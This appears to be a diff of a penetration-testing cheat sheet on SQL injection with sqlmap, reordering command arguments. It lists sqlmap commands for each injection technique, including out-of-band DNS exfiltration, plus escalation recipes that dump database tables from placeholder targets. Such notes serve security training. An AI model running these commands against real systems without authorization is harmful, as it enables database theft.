@@ -59,7 +59,7 @@ Try the simpler/faster techniques (of `BEUSTQ`) first to find easy wins, but
 
 **NOTE: remember this will miss techniques!**
 ```bash
-sqlmap -u "<URL>" --risk 3 --level 5 --technique=BEUS --batch
+sqlmap --risk 3 --level 5 --technique=EUBS --batch -u "<URL>"
 ```
 
 #### Blind Boolean
@@ -69,7 +69,7 @@ Infer data from whether the page content or behaviour changes (true vs false).
 **NOTE:** careful this is a very unstable method that might require multiple runs or `--no-cast`
 
 ```bash
-sqlmap -u "<URL>" --technique=B --level 5 --risk 3
+sqlmap --technique=B --level 5 --risk 3 -u "<URL>"
 ```
 
 #### Error-based
@@ -77,7 +77,7 @@ sqlmap -u "<URL>" --technique=B --level 5 --risk 3
 Trigger DB errors that leak data inside the error message.
 
 ```bash
-sqlmap -u "<URL>" --technique=E
+sqlmap --technique=E -u "<URL>"
 ```
 
 #### Union-based
@@ -85,7 +85,7 @@ sqlmap -u "<URL>" --technique=E
 Combine two queries to dump data directly into the response. Count the displayed columns (and maybe iteratively increase columns amount)
 
 ```bash
-sqlmap -u "<URL>" --technique=U --union-cols=5
+sqlmap --technique=U --union-cols=5 -u "<URL>"
 ```
 
 #### Stacked queries
@@ -93,7 +93,7 @@ sqlmap -u "<URL>" --technique=U --union-cols=5
 Append extra SQL statements after the vulnerable one (e.g. INSERT/UPDATE/DELETE or OS commands); requires DB support (e.g. MSSQL, PostgreSQL).
 
 ```bash
-sqlmap -u "<URL>" --technique=S
+sqlmap --technique=S -u "<URL>"
 ```
 
 #### Blind Time
@@ -101,7 +101,7 @@ sqlmap -u "<URL>" --technique=S
 Infer data from response delays (e.g. SLEEP) when the condition is true.
 
 ```bash
-sqlmap -u "<URL>" --technique=T
+sqlmap --technique=T -u "<URL>"
 ```
 
 #### Inline queries
@@ -109,7 +109,7 @@ sqlmap -u "<URL>" --technique=T
 Query embedded inside the original query; uncommon and app-dependent.
 
 ```bash
-sqlmap -u "<URL>" --technique=Q
+sqlmap --technique=Q -u "<URL>"
 ```
 
 #### Out-of-band
@@ -117,7 +117,7 @@ sqlmap -u "<URL>" --technique=Q
 Exfiltrate via DNS or HTTP to a server you control when no output is visible.
 
 ```bash
-sqlmap -u "<URL>" --dns-domain=<DOMAIN>
+sqlmap --dns-domain=<DOMAIN> -u "<URL>"
 ```
 
 ## Database Enumeration
@@ -162,16 +162,16 @@ sqlmap -u "<URL>" --dns-domain=<DOMAIN>
 
 ```bash
 # Show DBMS errors
-sqlmap -u "http://target.com/vuln.php?id=1" --batch --parse-errors
+sqlmap --batch --parse-errors -u "http://target.com/vuln.php?id=1"
 
 # Log traffic to file
-sqlmap -u "http://target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
+sqlmap --batch -t /tmp/traffic.txt -u "http://target.com/vuln.php?id=1"
 
 # Verbose (e.g. level 6)
-sqlmap -u "http://target.com/vuln.php?id=1" -v 6 --batch
+sqlmap -v 6 --batch -u "http://target.com/vuln.php?id=1"
 
 # Via Burp
-sqlmap -u "http://target.com/vuln.php?id=1" --batch --proxy http://127.0.0.1:8080
+sqlmap --batch --proxy http://127.0.0.1:8080 -u "http://target.com/vuln.php?id=1"
 ```
 
 ### Attack Tuning Escalation
@@ -186,14 +186,14 @@ When default `sqlmap` fails to find an injection, match your scenario to one of 
 *   `--risk 3` enables `OR` payloads.
 *   `--level 5` tests maximum combinations of closing brackets/quotes.
 ```bash
-sqlmap -u "http://<TARGET>/case5.php?id=*" --level 5 --risk 3 -T <TABLE> --dump --batch
+sqlmap --level 5 --risk 3 -T <TABLE> --dump --batch -u "http://<TARGET>/case5.php?id=*"
 ```
 
 **Archetype B: The Custom Boundary (Manual Prefix)**
 *Use when you manually found the syntax breaker in Burp (e.g., `)`), but SQLMap isn't guessing it.*
 *   `--prefix` forces SQLMap to inject the exact closing syntax before its payload.
 ```bash
-sqlmap -u "http://<TARGET>/case6.php?col=id" --prefix='`)' --dump --batch
+sqlmap --prefix='`)' --dump --batch -u "http://<TARGET>/case6.php?col=id"
 ```
 
 **Archetype C: The Union Structure Failure**
@@ -201,7 +201,7 @@ sqlmap -u "http://<TARGET>/case6.php?col=id" --prefix='`)' --dump --batch
 *   `--technique=U` forces UNION-based SQLi (saves time).
 *   `--union-cols=5` tells SQLMap exactly how many columns exist (find this manually with `ORDER BY 5` in Burp).
 ```bash
-sqlmap -u "http://<TARGET>/case7.php?id=1" --technique=U --union-cols=5 --dump --batch
+sqlmap --technique=U --union-cols=5 --dump --batch -u "http://<TARGET>/case7.php?id=1"
 ```
 
 #### Advanced Tuning
